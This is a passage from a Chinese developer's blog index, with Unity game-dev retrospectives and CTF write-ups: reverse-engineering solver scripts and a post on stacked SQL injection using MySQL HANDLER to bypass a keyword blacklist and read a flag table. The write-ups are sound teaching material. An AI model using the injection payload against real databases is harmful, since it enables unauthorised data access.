研究一下DoTween的源码，手上还有一套TBS的简单框架也研究一下，回头写个博客。 就先这样欢迎投票 https://game.academy.163.com/event/mg?page=works\u0026id=2443 ","date":"2021-11-01T09:03:00Z","image":"https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD_hu2405021342874881743.jpg","permalink":"https://dorinxl.github.io/p/%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%982021%E7%BD%91%E6%98%93%E6%B8%B8%E6%88%8F%E9%AB%98%E6%A0%A1mini-game%E6%8C%91%E6%88%98%E8%B5%9B%E4%BD%9C%E5%93%81%E6%88%8F%E5%B9%95%E6%9C%AA%E8%90%BD/","title":"【开发复盘】2021网易游戏高校MINI-GAME挑战赛作品《戏幕未落》"},{"content":"【GameJam】机核网BOOOM游戏创作挑战开发复盘 要开学了，返校前进行一波复盘。\n我们组的作品《GANDER COMPANY》，介时会有宣传视频，并会在机核网游戏创作市集线上展示。之后会在这里补上链接。 https://www.gcores.com/games/67514\n程序只有我一个人啊，所以复盘也来得很快，把一些想法和思路写在这里，没啥技术力，凑活看，权当记录。\n游戏本质问题 引擎用的unity 2020.3.14f1c1 ，当策划确定下游戏主题之后，就该我考虑实现方式了。\n这次项目首次引进了3D建模，但本身还是和2D的结合，实质就是一个2D游戏，只不过表现上进行了伪3D。\n虽然场景是3D的，而且存在光影。但游戏只有左右控制，也就是只有X轴，甚至没有上下，出现上下都是程序出bug了，所以说本质就是个2D横板游戏。\n相机视角问题 由于存在场景3D+人物2D，摄像机直接和人物一个平面就好，调整下y轴和z轴，让摄像机跟人物有个合适的距离，看着舒服。\n然后因为模型师也算是外包性质（策划叫的同学短时合作），我们之前也没有尝试将3D元素添加进来，所以场景模型上可能会有些小问题，比如说房间建模稍小这样子，都不是什么大问题，我在unity里略作调整就好。\n这里就涉及到摄像机的位置了，多个房间，我是直接摆在同一个场景里的，场景跳转切个黑幕直接换人物坐标。要控制摄像机的视角内不会出现其他不该出现的内容。\n用Vector3.Lerp给摄像机加个跟踪人物，然后写了个数组用Mathf.Clamp控制摄像机的范围，方法有些简陋，但是能实现需求。\n2D在3D上的投影 这个问题纠结了我半天，3D物体自带投影，但是2D就是个图片，我一时不知道怎么投影。\n然后跟着这个做了半天，发现涉及到渲染了，顿时感觉不妙。\n琢磨了好几天，甚至都要开始搞shader了，然后发现了个简单的解决方式。\n首先简单的搭一个场景：\n想要让2D投影,需要对Sprite Renderer进行设置：\n点右上角的三个点，然后选debug：\n将sprite renderer的投影和接受阴影都打开：\n接下来给sprite换个材质，2d人物不会有阴影的，但是我偶然发现了这个材质可以让人物拥有：\n记得打开灯光的阴影选项，不然不会产生阴影：\n由于我不太懂渲染这块，这个粒子系统为什么会有，使用它会产生什么样的影响，我都不太明白，但是他能用。这个材质其实有个缺点，就是他只能单面：\n所以这里卡了我好几天，找不到解决方式，很难受。\n这个视频给了灵感。可以在评论区找到我（\n解决这个问题很简单，只要重新做一个材质，然后勾选上双面选项就行了。\n双击这个材质，默认材质不能修改，但我们可以看到一些信息：\n所以只要右键创建一个Material，然后仿制做成这个样子就可以了：\n给sprite换上新的材质，就实现了双面投影！\n怎么样，是不是很帅气呢！来，试试看！\n面向对象思想的便捷 这次的小demo中最主要的互动如图下：\n就是一个靠近会弹动画，离开会收动画，触发会产生事件的触发器。\n之前没怎么在项目中好好的用面向对象的思想，这次用上了，感觉就是非常爽。\n写一个基类触发器，然后通过继承多态延伸出不同的触发事件，十分方便，十分的雅致。\n一些不足 剧情演出效果不足 之前写的gal框架被我多次使用，但是从来没升级过。考虑一下完善框架了。\n目前的框架最大的问题就是演出效果，我是用协程来实现人物、场景的过渡，但是在一定条件下貌似会起冲突，很不爽。\n正在试图找到新的代替方案，希望能有一种更优雅的过渡方式。\n战斗系统的bug 战斗这块是上海七天写的，不够稳定，经常出一些莫名其妙的效果。\n比如这次的开发，在3D场景用2D物理战斗，效果十分滑稽，策划说是“人仰马翻的战斗”，确实如此（具体可以亲自游玩体验）。我也不是很满意，但是时间紧任务多没来得及尝试新的解决方案，先在这里记录下。\nUI的适配问题 游戏做好了，提交了，我才想起来UI的适配不是很好，在1920*1080下效果最佳。\n这波是没有规划好开发路线，我的锅。\n总结 三月到五月，我完成了基础的gal框架，并且从0学会了使用unity的部分板块，接触了UI以及一些基本内容。\n七月后半旬，接触了2d物理引擎，到此算是拥有制作低水平小游戏的能力了。\n八月就是一次技能整合，把我会的东西都用上了，整了这么一出。\n要开学了，我目前的规划是积累沉淀。\n我思考了一下，本质上自己还是一个程序员，那么想要有进步就要先把本职做好。\n就算unity用的驾轻就熟，数据结构、算法、数据库、网络这些没学好也没什么用。\n一个基础扎实的人，哪怕培训他学unity也会上手很快。\n所以我决定回头，把基础学好，这是稳赚不赔的买卖。\n这不意味着延缓梦想，只不过是为了更好的出发。\n","date":"2021-08-27T16:12:00Z","permalink":"https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/","title":"【GameJam】机核网BOOOM游戏创作挑战开发复盘"},{"content":"上海一周自由行结束! 指每天在宾馆爆肝代码，好不容易有时间了还遇上台风哪也没去的一周。 ​ 见识了一流大学的模样\n​\n总结复盘一下:\n第一天跟策划交流想法并控制他不要做出我实现不了的决定\n第二天敲代码，功能实现验证\n第三天敲代码，玩家动作控制\n第四天敲代码，敌人行为状态机\n第五天敲代码，完成四个敌人的行为\n第六天敲代码，给角色加状态，这个时候已经打不过自己的游戏了\n第七天敲代码，切实感受项目上线前跟本没写完的危机，短短一上午完成地图场景人物对话缝合好整套流程，忍痛切割了部分功能，最后演示完成后人直接升天。\n​ 快乐白模时间\n​ 主美妈咪好强\n​ \u0026hellip;过于简陋了，考虑了下还是放出来吧\n这几天下来，感悟颇多，难以言表。周围有很多志同道合的朋友，各自心里怀揣着相似相近的野心和梦想，在交流和冲突之中，面对游戏我仿佛有了更深的体验，但也更加陌生。这些都是我从未体验过的。\n大学过了一半了，我必须认识到游戏开发与网络安全不能并重，我选择了我热爱的方向，所以这是一次求道问心之旅。独自前往中国最繁华的城市之一，与相识已久的网友第一次碰面，在人群中寻找合作伙伴，用六天时间合力开发出一个能让自己满意的作品。\n这是我想要的么?这确实是。\n结果是否满意?多给我点时间我能做的更好。\n累么?不累是不可能的，但沉浸在开发中是感受不到累的，只有在最后倦意才会一起袭来。\n​ 与其说是来体验游戏开发的大致流程，不如说是对自我的一次挑战，参与像是gamejam一样的极限开发，并从中学习到新事物。\n比较遗憾的是突遇台风，没有玩好，没有合影，没有留下这段时间的痕迹和记录。\n但还好，来就是明心证道，对未来感到迷茫，至少自己选了一条方向，能做到无悔已是足够。\n人生如戏，一款游戏能带给我的思考和感悟，生活自然带来的更多，或许是无聊的自我感动，但我很享受这种感动。\n总结一句话就是，不负此行。\n","date":"2021-07-27T15:51:00Z","image":"https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b\u0026ek=1\u0026kp=1\u0026pt=0\u0026bo=WAIgA1gCIAMRECc%21\u0026t=5\u0026tl=3\u0026su=0196274450\u0026tm=1627398000\u0026sce=0-12-12\u0026rf=2-9_hu13878913932948283491.jpg","permalink":"https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/","title":"【UGDAP】上海一周自由行结束!"},{"content":"【Unity】脚本解释器的一种实现 Galgame引擎/框架本身就是一个解释器，解释脚本读取配置文件，进行演出。\n保存存档时要将当时脚本的运行状态保存下来，以便读档时继续执行，也就是脚本运行状态的序列化与反序列化。\n——JomiXedYu http://www.imxqy.com/gamedev/unity/ugal.html#toc-8\n前辈所言，我深以为然。\ngalgame的剧情，说白了就是指令操控内容。而这种文字游戏的卖点就是图像与剧情。程序显然写不出大量的剧情脚本，但是编剧也不一定会写程序。所以我决定将团队中编剧与程序彻底分离，让编剧只用excel表格就可以控制游戏流程。\n这样做缺点也很明显，表格之间是不存在逻辑的。只能一行一行的取出数据，执行。\n不过做一款视觉小说，这样的方法够用了，而且可以省下不少时间，规定一套逻辑执行语句也方便维护修改。\n思路 大致来讲就是“制定规则——编剧写入excel——程序读取excel——执行”，很简单。\n在这个基础上我们可以添加一些其他内容，比如目前我开发的流程为：\n我尝试写入excel一些数据，这个过程十分痛苦，就像便秘了好几天。而且会出现肉眼检查不到的错误。所以我写个小工具帮助编剧导入并保存数据到excel。\n关于读取数据这部分，一开始我的选择是游戏运行时读excel，但是这样做感觉很累赘，不如直接写成json然后程序去读json来的快。\n其实程序这方面还是有很多不足，软件的设计模式摸得不是很清楚，仍需努力（指先做出来再说）。\n规则与小工具 上面这张图是和编剧做好的指令规则约定以及这个小工具的界面，用选项可以帮助编剧不写入奇怪的符号或者不在范围内的规则。\n因为是自己写的，所以后面制定新的规则或者需求了可以很快速的修改。\n写入excel 用微软的com组件操作excel，保存的时候直接excel.Value赋值。\n在unity中写个MenuItem，游戏运行前用JsonUtility.ToJson()创造j或者更新son文件。\n读取Excel 直接JsonUtility.FromJson\u0026lt;\u0026gt;();\n解析成一句一句话然后在游戏运行状态机需要解析的时候找到对应函数执行即可。\n妄言妄听 如此这般，基本脚本解释器的思路就是这样。\n回看代码，深觉自身不足，无论是设计模式还是安全架构，我负责的程序只能拿个40分。\n","date":"2021-06-08T12:39:00Z","permalink":"https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/","title":"【Unity】Galgame视觉小说游戏 其脚本解释器的一种实现"},{"content":"前提： 最近沉迷游戏开发，想着在不考虑上线的情况下和别人合作做几款产品出来。正好碰上校赛，那就用手边的一些小练习写个re题。\n打包项目的时候，如果不进行其他操作，项目中的cs代码，甭管有用的没用的，在打包时通通都会被打进Assembly-CSharp.dll中，运行的时候通过Mono调用。所以有一种保护项目的手段就是对导出工程的Assembly-CSharp.dll进行加密，加载的时候对之进行解密\nwp： 这个题大部分精力放在写游戏逻辑上了，所以没有对项目进行保护措施。\n直接进入GameTime!\\GameStart_Data\\Managed目录找Assembly-CSharp.dll文件，扔进dnspy或者其他的.net反编译工具里就能看到源码。\n看着文件挺多，但是绝大部分都是游戏逻辑，跟flag没什么关系。\n为了方便定位我直接把加密flag的cs代码命名成带有flag的文件，所以我们进入ScoreAndFlag里面看看：\n代码写的比较丑，但逻辑还是能看明白的，比如ScoreAdd:\nflag就是对“974”进行sha1的结果在来一次md5。\nsha1最终返回的结果全部大写，这些结果在传给md5()，返回前三十位，就是flag了。\n所以这个题出的一般，因为他只是个垃圾小游戏，不是题。\n题目文件： 链接：https://pan.baidu.com/s/1dNlYwzzbDNHjcMo_2lUtiw 提取码：kq1z\n感谢阅读。\n","date":"2021-04-25T05:05:00Z","permalink":"https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/","title":"【个人向】ctf比赛出的一道逆向游戏题——GameTime题解"},{"content":"框架梳理 目前分为五块：菜单场景、游戏场景、CG场景、存读取存档场景、场景衔接。 未来添加的一些功能：游戏设置界面、游戏过程中的读档等UI、程序和剧情分离，供编剧测试的插件、对话回顾等。 个人学习作品，仅供参考，两周匆忙赶出，代码水平不高，还望见笑。 菜单场景： 主要功能：作为菜单，为不同按钮绑定切换场景的事件。\n主要函数：\nAwake()：为各个button绑定事件\nOpenGame()：切换场景到游戏场景\nOpenCG()：切换场景到查看cg\nOpenFiles()：切换场景到读取存档\nExitGame()：退出游戏\nCG场景： 主要功能：提供可以查看cg图像或是人物简介等游戏内容的场景，目前只能查看cg图像\n主要函数：\n存在GlobalSetting.CGShows[]变量存放在GlobalSetting.cs中，作为是否解锁cg图的参考。\nStart()： 通过读取GlobalSetting.cs中的全局变量来判定是否给图像解锁。\nUpdate()：检测是否打开了cg图像，如果打开了cg的话点击任意位置退出\nBackToMenu()：返回到主界面\nShowCG()：打开panel，显示cg\n【暂留问题】：每次重新启动游戏时，全局变量重置，需要在其他地方另外保存数据 游戏场景： 游戏场景初始化.cs 在Awake()中读取存档，若不为空则提前初始化gamescene\n游戏场景.cs 主要功能：提供游戏界面的显示，根据剧本推进剧情。提供存档读档。有一个渐入渐出状态机。\n主要函数：\nStart()：初始化，调用Init()函数\nUpdate()：检测到点击则开始下一条剧情，同时提供图片的淡入淡出功能\nInit()：一些参数的定义（淡入淡出的状态等），绑定按钮事件\nShowFileSave()：调用之后出现存档的panel\nSetBackground(string bgName)：传入名字从resources中调出背景图片并显示\nDelBackground()：渐出背景图片\nSetCharaImage(string charaName, string pos)：传入名字和位置从resources中调出人物图片并在左或右侧显示\nDelCharaImage(string pos)：渐出人物图片\nFadeInImg(Image img)：渐入图片需要调用的函数，修改渐入渐出状态机\nFadeOutImg(Image img)：渐出图片需要调用的函数，修改渐入渐出状态机\nUpdateColorAlpha()：在渐入渐出状态机执行的时候进行图片的alpha检测和切换，alpha\u0026gt;1或\u0026lt;0时切换状态\nUpdateColorAlphaRightNow()：在图片渐入渐出的时候如果鼠标点击，则立刻修改状态并完全渐入/渐出图片（即图片的透明度立刻变为0或1）\nSetDialogText(string name,string content)：对话框的姓名和内容\nSetTalkingChara(string pos)：调整正在说话的人物的图片透明度，突出对话的主体人物\nSetMusic(string bgmName)：传入名字从resources中调出音乐并播放\nBackToMenu()：返回主菜单\nSetCharaImageFromFile(string charaName, string pos)：从存档中进入时，传入名字和位置从resources中调出人物图片并在左或右侧显示\nSetBackgroundFromFile(string bgName)：从存档中进入时，传入名字从resources中调出背景图片并显示\n【存在问题】：这里十分臃肿，只有写出这个的人（我）才能理解大概。\n剧本读取与解析.cs 主要功能：读取剧本存入对应的数据结构中并解析，反馈给游戏界面。有一个剧情状态机\n主要函数：\nStart()：读取剧本文件并存入到自定义数据类型ItemManager中\nUpdate()：剧情状态检测\nClicked()：鼠标点击事件，可以切换状态\nStartAVG()：初始化状态机\nGoToState(STAGE next)：提供状态，切换到该状态\nPraseNextLine()：分析下一行剧情命令，并传入对应的函数\nDealWithCommand(Line tmpLine)：按照Command剧情命令执行\nCheckTypingFinished()：检查对话时是否说完\nDealWithText(Line tmpLine)：按照Text剧情命令执行\nUpdateContentString()：按帧更新对话框内容，实现打字机的效果\nUpdateAllString()：在打字机打字的过程中若是再次点击鼠标则一次性显示未说完的所有内容。\n存档管理.cs Start()：绑定按钮事件，创造文件路径\nClosePanel()：关闭存档panel\nPackingData(SaveData sd1)：打包存档数据\nWriteData(StreamWriter temp)：写入存档\nClickSave()：点击存档按钮即可存档。\n存读取存档场景： 存档场景管理.cs 主要功能：再打开存档场景时加载存档，并提供入口进入游戏。\n主要函数：Start()、BackToMenu()、LoadData()\nStart()：读取存档文件并绑定按钮事件\nBackToMenu()：返回主菜单\nLoadData()：加载存档并进入游戏\n读档.cs Awake()：单例模式\nWriteSceneData(List\u0026lt;string[]\u0026gt; data)：将存档写入列队，方便加载游戏场景的时候读取\nReadSceneData()：在gameseceninit中读取存档列队\nToGameScene(string[] SaveFile)：跳转到游戏场景\n存档.cs 自定义数据结构，存放着存档和读档需要的数据，包括剧情脚本行数、对话、背景、音乐等。\n场景衔接 例如背景音乐在主菜单和存档场景切换时不会停掉、画面的渐入渐出。\n背景音乐的控制：\n建立一个循环音乐的预制体，这个预制体上挂载一个DontDestroyOnLoad的脚本。\n在需要播放背景音乐的几个场景挂载另一个GlobalUIMusic.cs，这个脚本为单例模式，如果存在则不产生新的，如果不存在则实例化预制体。 成品GIF ","date":"2021-04-04T09:17:00Z","permalink":"https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/","title":"【Unity】自制GalGame框架梳理"},{"content":"HANDLER进行堆叠注入 [GYCTF2020]Blacklist 过滤了很多的关键词\n你可以尽情堆叠，但是令人难过的是你读不出来，也不能像强网杯那样alert改名字。\n但是我们还有handler这个东西\nmysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | \u0026lt;= | \u0026gt;= | \u0026lt; | \u0026gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。 通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。 通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 使用：\n1 ?inject=1\u0026#39;;HANDLER `FlagHere` OPEN;HANDLER `FlagHere` READ FIRST; 来读取内容，get到flag\n同时，这种解法也适用于强网杯\n[强网杯 2019]随便注 show tables看看都有什么表。\n网上的wp有改表名的，也有预处理的，在此不再赘述，我们直接使用handler：\n数据库真是太美妙了 ","date":"2020-11-20T09:22:00Z","permalink":"https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","title":"HANDLER进行堆叠注入"},{"content":"题目名称：EASYMAZE 出题人:Gyan\nIDA不好用了？因为这是C#\n扔进dnspy\n进入check函数发现这是一个迷宫\n从C经过*走到X,0为下，1为上，2为右，3为左\n路径：2220000000221220221221133333311222211220022112220030020002\n提交dino{2220000000221220221221133333311222211220022112220030020002}发现不对?\n继续审计代码，找到两个关键的地方\n第一个地方是将数据转换成十六进制，第二个地方是将这个十六进制的数据拆成前两位和后两位，即 \u0026lsquo;a\u0026rsquo; =\u0026gt;0xa =\u0026gt;1010 =\u0026gt; array2 = {10,10}，所以我们应该一次\u0026quot;走两步“\n即22 =\u0026gt;1010 =\u0026gt;a，以此类推\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 //最后部分我是手算的，附上DorinXL师傅的脚本 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstring\u0026gt; using namespace std; int main(){ char s[] = \u0026#34;2220000000221220221221133333311222211220022112220030020002\u0026#34;; int a,b; char flag[50]; for(int i = 0;i \u0026lt; 29;i++){ for(int j = 0;j \u0026lt; 128;j++){ a = j \u0026gt;\u0026gt; 2; b = j \u0026amp; 3; if((a == (s[i * 2] - \u0026#39;0\u0026#39;)) \u0026amp;\u0026amp; (b == (s[i * 2 + 1] - \u0026#39;0\u0026#39;))){ if(j \u0026gt;= 0 \u0026amp;\u0026amp; j \u0026lt;= 9){ flag[i] = \u0026#39;0\u0026#39; + j; } else if(j \u0026gt;= 10 \u0026amp;\u0026amp; j \u0026lt;= 16){ flag[i] = \u0026#39;a\u0026#39; + j -10; } break; } } } for(int i = 0;i \u0026lt; 29;i++){ cout\u0026lt;\u0026lt;flag[i]; } } 题目名称:嘘! 出题人:Gyan\n双击后打不开？？？？直接扔进IDA\n发现一大堆看不懂的东西!!!\n往旁边函数里一看，发现一个创建窗口的函数WinMain\n点击即得flag\n题目名称:捉迷藏 出题人:DorinXL\n查壳！出这个题的师傅本来没加壳的，我（Nameless）手贱加了:)\n直接upx -d 脱壳 （记得用高版本的upx，不然可能失败）手脱可无视\n脱完壳后扔进ida,shift+F12一把梭\n在几个有字符串的地方找到数据，然后直接按R\n如：\n找到其他几段后，拼接出来就行\n题目名称:base64 出题人:DorinXL\nida64打开，发现是base64编码加密\n看左边函数，会发现ohMyGod函数，进去看后，发现更换了base64的表（这里如果不懂，要去看base64的原理）\n写出新表的脚本\n1 2 3 4 5 6 7 8 9 key = \u0026#34;Y2R1KgtDM195M3VIN25vK19FYXaCX2OGMWCsJT99\u0026#34; table = list(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;) for i in range(25): tmp = table[i] table[i] = table[39 -i] table[39-i] = tmp m = \u0026#39;\u0026#39;.join(table) print(m) 得到新表后，用base64的脚本or工具直接解出\n题目名称:BabyAndroid 出题人:Nameless\n直接扔进JEB\n进去后发现看不懂，直接decompile\n稍微代码审计一下发现就是一个简单的异或\n上脚本\n1 2 3 4 5 6 7 li = [18, 36, 8, 67, 36, 3, 64, 61, 28, 2, 1, 13, 4, 36, 68, 48, 5, 26, 60, 100, 84, 15] st = list(\u0026#34;tHi$_Is_CKrRect_aNsTer\u0026#34;) flag = list(\u0026#34;flag{J3b_Is_aG0odTO01}\u0026#34;) s = \u0026#39;\u0026#39; for i in range(22): s += chr(ord(st[i]) ^ li[i]) print(s) 题目名称:方程组? 出题人:Nameless\n解线性方程组\n直接上脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 import z3 v1 = z3.Int(\u0026#39;v1\u0026#39;) v2 = z3.Int(\u0026#39;v2\u0026#39;) v3 = z3.Int(\u0026#39;v3\u0026#39;) v4 = z3.Int(\u0026#39;v4\u0026#39;) v5 = z3.Int(\u0026#39;v5\u0026#39;) v6 = z3.Int(\u0026#39;v6\u0026#39;) v7 = z3.Int(\u0026#39;v7\u0026#39;) v8 = z3.Int(\u0026#39;v8\u0026#39;) v9 = z3.Int(\u0026#39;v9\u0026#39;) v10 = z3.Int(\u0026#39;v10\u0026#39;) v11 = z3.Int(\u0026#39;v11\u0026#39;) v12 = z3.Int(\u0026#39;v12\u0026#39;) v13 = z3.Int(\u0026#39;v13\u0026#39;) v14 = z3.Int(\u0026#39;v14\u0026#39;) v15 = z3.Int(\u0026#39;v15\u0026#39;) v16 = z3.Int(\u0026#39;v16\u0026#39;) v17 = z3.Int(\u0026#39;v17\u0026#39;) v18 = z3.Int(\u0026#39;v18\u0026#39;) v19 = z3.Int(\u0026#39;v19\u0026#39;) v20 = z3.Int(\u0026#39;v20\u0026#39;) v21 = z3.Int(\u0026#39;v21\u0026#39;) v22 = z3.Int(\u0026#39;v22\u0026#39;) v23 = z3.Int(\u0026#39;v23\u0026#39;) v24 = z3.Int(\u0026#39;v24\u0026#39;) a = [ 0x295b,0x1050,0x1c7a,0x11f,0xe4c,0x1827,0x31a4,0x11bb,0xb2b,0x116a,0x10a6,0xb81,0x1012,0x1514,0x10c4,0x1089,0x1d2,0x119b,0x7af,0x874,0x13e7,0x177b,0xbe9,0x2068] s = z3.Solver() s.add(a[0]== 32 * v1 - 6 * v2 + 44 * v3 - 56 * v4 + 77 * v5) s.add(a[1]== 22 * v1 - 5 * v2 + 7 * v3 - 22 * v4 + 33 * v5) s.add(a[2]== 41 * v1 - 3 * v2 + 21 * v3 - 39 * v4 + 44 * v5) s.add(a[3]== 13 * v1 - 20 * v2 + 31 * v3 - 41 * v4 + 19 * v5) s.add(a[4]== 22 * v1 - 19 * v2 + 29 * v3 - 2 * v4 + 7 * v5) s.add(a[5]== 24 * v6 + 12 * v7 + 37 * v8 - 11 * v9 + 12 * v10) s.add(a[6]== 79 * v6 + 76 * v7 + 23 * v8 - 15 * v9 + 20 * v10) s.add(a[7]== 35*v6 + 30*v7 + 16 * v8 - 28*v9+ 21*v10) s.add(a[8]== 19 * v6 + 29 * v7 + 11 * v8 - 23 * v9 + 17 * v10) s.add(a[9]== 24 * v6 + 33 * v7 + 18 * v8 - 19 * v9 + 13 * v10) s.add(a[10] ==32 * v11 - 6 * v12 + 44 * v13 - 56 * v14 + 77 * v15) s.add(a[11] == 46 * v11 - 78 * v12 + 99 * v13 - 67 * v14 + 87 * v15) s.add(a[12] == 75 * v11 - 7 * v12 + 18 * v13 - 66 * v14 + 54 * v15) s.add(a[13] == 25 * v11 - 64 * v12 + 85 * v13 - 31 * v14 + 97 * v15) s.add(a[14] == 31 * v11 - 56 * v12 + 35 * v13 - 13 * v14 + 99 * v15) s.add(a[15] == 57 * v16 - 25 * v17 + 32 * v18 - 33 * v19 + 71 * v20 - 69 * v21 + 75 * v22) s.add(a[16] == 67 * v16 - 7 * v17 + 33 * v18 - 35 * v19 + 31 * v20 - 97 * v21 + 99 * v22) s.add(a[17] == 77 * v16 - 11 * v17 + 54 * v18 - 47 * v19 + 47 * v20 - 71 * v21 + 83 * v22) s.add(a[18] == 27 * v16 - 12 * v17 + 34 * v18 - 39 * v19 + 97 * v20 - 99 * v21 + 93 * v22) s.add(a[19] == 15 * v16 - 32 * v17 + 19 * v18 - 19 * v19 + 95 * v20 - 69 * v21 + 57 * v22) s.add(a[20] == 33 * v16 - 61 * v17 + 72 * v18 - 13 * v19 + 93 * v20 - 79 * v21 + 87 * v22) s.add(a[21] == 55 * v16 - 26 * v17 + 57 * v18 - 21 * v19 + 22 * v20 - 33 * v21 + 79 * v22) s.add(a[22] == 24 * v23 + 5 * v24 ) s.add(a[23] == 71 * v23 + 9 * v24) if s.check(): print(s.model()) # [v13 = 95, # v5 = 123, # v16 = 95, # v24 = 125, # v12 = 101, # v14 = 116, # v21 = 114, # v2 = 108, # v10 = 48, # v18 = 51, # v20 = 101, # v3 = 97, # v15 = 48, # v6 = 87, # v23 = 101, # v19 = 118, # v7 = 51, # v4 = 103, # v8 = 108, # v22 = 51, # v17 = 82, # v11 = 109, # v1 = 102, # v9 = 99] a = [102,108,97,103,123,87,51,108,99,48,109,101,95,116,48,95,82,51,118,101,114,51,101,125] flag = \u0026#34;\u0026#34; for i in a : flag += chr(i) print(flag) 题目名称:Crypto 出题人:Nameless\n两种解法\n打开IDA,会发现key = \u0026ldquo;CDUTCTF\u0026rdquo; ，从函数名可以分析出采用的是rc4加密\n解法1.已知密钥为CDUTCTF，直接用rc4进行计算即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; typedef unsigned longULONG; void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i\u0026lt;256; i++) { s[i] = i; k[i] = key[i%Len]; } for (i = 0; i\u0026lt;256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; } } void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len) { int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k\u0026lt;Len; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; } } int main() { unsigned char s[256] = { 0 }, s2[256] = { 0 };//S-box char key[256] = { \u0026#34;CDUTCTF\u0026#34; }; char pData[512] = {0x24,0x18,0x74,0x78,0x26,0x8e,0xed,0xd6,0xea,0x38,0x73,0xed,0xed,0xe4,0x85,0xb4,0x18,0x4e,0x0e,0x01}; unsigned long len = strlen(pData); int i; rc4_init(s, (unsigned char*)key, strlen(key)); for (i = 0; i\u0026lt;256; i++) { s2[i] = s[i]; } rc4_crypt(s2, (unsigned char*)pData, len); printf(\u0026#34;pData=%s\u0026#34;, pData); return 0; } 解法2.gdb调试\n在rc4_crypt处下断点 向下单步调试（注意堆栈和寄存器的信息） 得到flag 题目名称：DinoTree 出题人:DorinXL\n丢进f5，代码审计发现两个关键地方，查看qwq和qaq数组\n可以看到两个字符串，那么进行反解，要注意看for循环的长度\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 qwq = \u0026#34;noiFusL\\\\Wf;zmu\u0026#34; qaq = \u0026#34;ihs@}oRY5}ernD \u0026#34; s =\u0026#34;\u0026#34; # print(len(qwq)) # print(len(qaq)) for i in range(5,len(qwq)): s += chr(ord(qwq[i])^8) print(s) f 